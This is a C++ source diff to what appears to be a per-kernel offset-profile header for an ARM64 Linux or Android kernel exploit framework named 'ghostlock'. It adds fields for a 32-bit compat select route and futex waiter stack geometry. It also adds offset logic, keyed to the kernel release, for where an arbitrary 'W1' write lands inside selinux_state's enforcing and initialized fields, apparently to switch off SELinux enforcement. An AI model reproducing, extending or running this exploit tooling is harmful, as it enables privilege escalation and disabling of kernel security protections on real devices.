@@ -167,6 +167,16 @@ namespace ghostlock::profile {
          * 0x1000 and 0x20. See the geometry check in select_stack_route.cpp. */
         std::optional<uint64_t> select_lock_anchor_bytes;
         std::optional<uint64_t> select_lock_anchor_stride;
+        /* Compat (AArch32) select carrier: the select route runs in a 32-bit
+         * helper because these kernels' strip is below the 64-bit pselect
+         * buffer. `waiter_home` is the measured strip home below the compat
+         * entry sp (0x1b0 futex_time32 / 0x1c0 futex_time64) and
+         * `select_dst_depth` the measured compat _newselect buffer depth
+         * (0x1e0). Absent `compat_carrier` (or 0) keeps the 64-bit route.
+         * See docs/analysis/compat-select-carrier-plan.md. */
+        std::optional<uint8_t> select_compat_carrier;
+        std::optional<uint32_t> select_waiter_home;
+        std::optional<uint32_t> select_select_dst_depth;
         /* Sigreturn route: where waiter byte 0 sits inside the 0x200-byte fpsimd
          * copy window `rt_sigreturn`'s restore performs. The value is per build
          * and per restore helper -- the SVE path copies at sp+0x10, the plain
@@ -180,6 +190,23 @@ namespace ghostlock::profile {
     };
 
     /* Native transport representation of one Kotlin-resolved profile. */
+    /* `selinux_state`'s field offsets (page-free Stage 1). `offset.
+     * selinux_enforcing` is the image offset of the struct itself; these are
+     * the fields inside it that W1's value lands on. Absent => the
+     * release-derived layout (enforcing 0; initialized 2 below 6.6, 1 from
+     * 6.6 -- checkreqprot sat between them until it was removed at 6.6). */
+    struct SelinuxFieldOffsets {
+        std::optional<uint32_t> enforcing;
+        std::optional<uint32_t> initialized;
+    };
+
+    /* W1's value source when the write does not use the reclaimed page: the
+     * image offset of a zeroed region whose direct-map alias (+0x100) becomes
+     * the value stored over selinux_state. Absent => the page path. */
+    struct W1ScratchSpec {
+        std::optional<uint64_t> image;
+    };
+
     struct kernel_offsets {
         const char *uname_r;
         uint8_t route;
@@ -189,6 +216,8 @@ namespace ghostlock::profile {
         WaiterLayoutOffsets waiter;
         KernelOffsets offsets;
         KernelMisc misc;
+        SelinuxFieldOffsets selinux;
+        W1ScratchSpec w1_scratch;
         RouteGeometry geometry;
         struct execution_settings execution;
 
@@ -220,6 +249,12 @@ namespace ghostlock::profile {
         std::optional<uint64_t> lock_anchor_image;
         std::optional<uint64_t> lock_anchor_bytes;
         std::optional<uint64_t> lock_anchor_stride;
+        /* Compat carrier (AArch32 helper). `waiter_home`/`select_dst_depth`
+         * are the measured geometry; the bitmap packer refuses any pair it
+         * cannot cover (in particular 5.10.236's 0x200/0x210 strips). */
+        std::optional<uint8_t> compat_carrier;
+        std::optional<uint32_t> waiter_home;
+        std::optional<uint32_t> select_dst_depth;
     };
 
     struct TcpZerocopyLayout {
@@ -265,6 +300,24 @@ namespace ghostlock::profile {
                 rebind_release();
             }
             return *this;
+        }
+
+        /* `major.minor` of the release string, 0/0 when it does not parse. */
+        void release_version(unsigned &major, unsigned &minor) const noexcept {
+            major = 0;
+            minor = 0;
+            const char *p = release();
+            while (*p >= '0' && *p <= '9') {
+                major = major * 10U + static_cast<unsigned>(*p - '0');
+                p++;
+            }
+            if (major != 0 && *p == '.') {
+                p++;
+                while (*p >= '0' && *p <= '9') {
+                    minor = minor * 10U + static_cast<unsigned>(*p - '0');
+                    p++;
+                }
+            }
         }
 
         /* Delegates to the copy constructor on purpose: rebinds the release buffer
@@ -420,6 +473,37 @@ namespace ghostlock::profile {
             return loaded_ ? values_.meta.kernel_major : 0;
         }
 
+        /* Page-free Stage 1: the image offset of W1's scratch region, absent
+         * when the profile keeps the reclaimed-page value. */
+        [[nodiscard]] std::optional<uint64_t> w1_scratch_image() const noexcept {
+            return loaded_ ? values_.w1_scratch.image : std::nullopt;
+        }
+
+        /* The byte of the W1 value that lands on `selinux_state.initialized`.
+         * A profile fact when the `selinux` block states it; otherwise
+         * release-derived, which is what every pre-stage-1 profile resolves
+         * to. */
+        [[nodiscard]] uint32_t selinux_initialized_offset() const noexcept {
+            if (!loaded_) return 2;
+            if (values_.selinux.initialized.has_value()) {
+                return *values_.selinux.initialized;
+            }
+            unsigned major = 0;
+            unsigned minor = 0;
+            release_version(major, minor);
+            if (major == 0) return 2;
+            return (major > 6U || (major == 6U && minor >= 6U)) ? 1U : 2U;
+        }
+
+        /* `selinux_state.enforcing`'s byte inside the struct (0 on every
+         * sampled image; stated by the profile so a future layout cannot
+         * silently keep the old constant). */
+        [[nodiscard]] uint32_t selinux_enforcing_offset() const noexcept {
+            return loaded_ && values_.selinux.enforcing.has_value()
+                       ? *values_.selinux.enforcing
+                       : 0;
+        }
+
         [[nodiscard]] MulticastWaiterLayout multicast_layout() const noexcept {
             return loaded_
                        ? (MulticastWaiterLayout){
@@ -445,6 +529,9 @@ namespace ghostlock::profile {
                            .lock_anchor_image = values_.geometry.select_lock_anchor_image,
                            .lock_anchor_bytes = values_.geometry.select_lock_anchor_bytes,
                            .lock_anchor_stride = values_.geometry.select_lock_anchor_stride,
+                           .compat_carrier = values_.geometry.select_compat_carrier,
+                           .waiter_home = values_.geometry.select_waiter_home,
+                           .select_dst_depth = values_.geometry.select_select_dst_depth,
                        }
                        : SelectStackLayout{};
         }
